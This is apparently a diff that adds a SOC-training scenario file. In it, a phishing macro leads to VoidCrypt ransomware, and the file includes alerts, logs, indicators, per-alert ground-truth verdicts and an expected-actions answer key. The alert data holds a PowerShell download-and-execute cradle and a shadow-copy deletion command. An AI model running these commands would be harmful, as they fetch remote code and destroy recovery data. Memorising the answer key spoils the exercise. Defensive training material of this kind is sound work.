@@ -1,0 +1,206 @@
+{
+  "id": "sc-081",
+  "title": "Shift 081 - Night Shift",
+  "category": "Ransomware",
+  "outcome": "escalation",
+  "difficulty": "Tier 3",
+  "briefing": "Endpoint and file server alerts are arriving in quick succession.",
+  "startTime": "02:30:00",
+  "context": {
+    "change_calendar": [],
+    "notices": []
+  },
+  "assets": {
+    "users": {
+      "a.adel": "FS-01"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "FIN-PC-29",
+      "user": "a.adel",
+      "summary": "Macro-enabled attachment Invoice_Q3.docm delivered to a.adel",
+      "details": {
+        "email_from": "billing@sso-service-team.net",
+        "email_to": "a.adel@corp.example",
+        "file_name": "Invoice_Q3.docm",
+        "file_hash": "f0e6292bee8582adb4ae094a698ff832fadadda66aba6e9567f8bdec730efe0c",
+        "action_taken": "Delivered",
+        "raw_log": "mail attach=Invoice_Q3.docm macro=yes spf=fail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 5,
+      "severity": "High",
+      "rule": "EDR: PowerShell download cradle",
+      "source": "EDR",
+      "host": "FIN-PC-29",
+      "user": "a.adel",
+      "summary": "powershell.exe downloaded a payload from sso-service-team.net on FIN-PC-29",
+      "details": {
+        "host_ip": "10.12.229.8",
+        "process": "powershell.exe",
+        "parent_process": "WINWORD.EXE",
+        "domain": "sso-service-team.net",
+        "command_line": "powershell -w hidden -c IEX((New-Object Net.WebClient).DownloadString('https://sso-service-team.net/a.ps1'))",
+        "raw_log": "EDR proc=powershell.exe parent=WINWORD.EXE net=https://sso-service-team.net/a.ps1"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1059.001"
+      },
+      "id": "A-1002"
+    },
+    {
+      "at": 12,
+      "severity": "Critical",
+      "rule": "EDR: shadow copies deleted",
+      "source": "EDR",
+      "host": "FIN-PC-29",
+      "user": "a.adel",
+      "summary": "vssadmin delete shadows /all executed on FIN-PC-29",
+      "details": {
+        "host_ip": "10.12.229.8",
+        "process": "vssadmin.exe",
+        "parent_process": "powershell.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "raw_log": "EDR proc=vssadmin.exe args='delete shadows /all /quiet' host=FIN-PC-29"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1490"
+      },
+      "id": "A-1003"
+    },
+    {
+      "at": 15,
+      "severity": "Critical",
+      "rule": "File server: mass file rename / entropy spike",
+      "source": "File Server",
+      "host": "FS-01",
+      "user": "a.adel",
+      "summary": "2439 files renamed with extension .voidcrypt on FS-01 within 3 minutes",
+      "details": {
+        "src_ip": "10.12.229.8",
+        "dst_ip": "10.10.0.20",
+        "protocol": "SMB",
+        "file_name": "README_VoidCrypt.txt",
+        "raw_log": "fs rename burst share=\\\\FS-01\\Finance ext=.voidcrypt user=a.adel"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1486"
+      },
+      "id": "A-1004"
+    }
+  ],
+  "logs": [
+    {
+      "t": "02:32:34",
+      "src": "proxy",
+      "host": "ENG-PC-38",
+      "user": "h.ibrahim",
+      "msg": "GET https://intranet.corp.example/home 200"
+    },
+    {
+      "t": "02:35:00",
+      "src": "proxy",
+      "host": "FIN-PC-29",
+      "user": "a.adel",
+      "msg": "GET https://sso-service-team.net/a.ps1 200"
+    },
+    {
+      "t": "02:38:33",
+      "src": "email",
+      "host": "SALES-PC-36",
+      "user": "h.fathy",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "02:39:48",
+      "src": "windows",
+      "host": "SALES-PC-12",
+      "user": "m.gamal",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "02:40:16",
+      "src": "email",
+      "host": "LEGAL-PC-37",
+      "user": "l.gamal",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "02:41:25",
+      "src": "edr",
+      "host": "HR-PC-22",
+      "user": "o.samir",
+      "msg": "Scheduled scan completed, 0 detections"
+    },
+    {
+      "t": "02:43:54",
+      "src": "windows",
+      "host": "HR-PC-09",
+      "user": "s.fathy",
+      "msg": "4624 logon type 2 (interactive) success"
+    },
+    {
+      "t": "02:45:00",
+      "src": "windows",
+      "host": "FS-01",
+      "user": "a.adel",
+      "msg": "5145 share access \\\\FS-01\\Finance by a.adel (write, burst)"
+    },
+    {
+      "t": "02:54:00",
+      "src": "proxy",
+      "host": "IT-PC-22",
+      "user": "m.ibrahim",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "02:58:33",
+      "src": "email",
+      "host": "IT-PC-26",
+      "user": "t.adel",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    }
+  ],
+  "iocs": {
+    "sso-service-team.net": {
+      "type": "domain",
+      "reputation": "malicious",
+      "note": "Ransomware loader hosting"
+    },
+    "f0e6292bee8582adb4ae094a698ff832fadadda66aba6e9567f8bdec730efe0c": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "VoidCrypt dropper document"
+    }
+  },
+  "expected_actions": [
+    "isolate_host:FIN-PC-29",
+    "isolate_host:FS-01",
+    "disable_account:a.adel",
+    "block_domain:sso-service-team.net",
+    "escalate_tier2",
+    "initiate_incident_response"
+  ]
+}
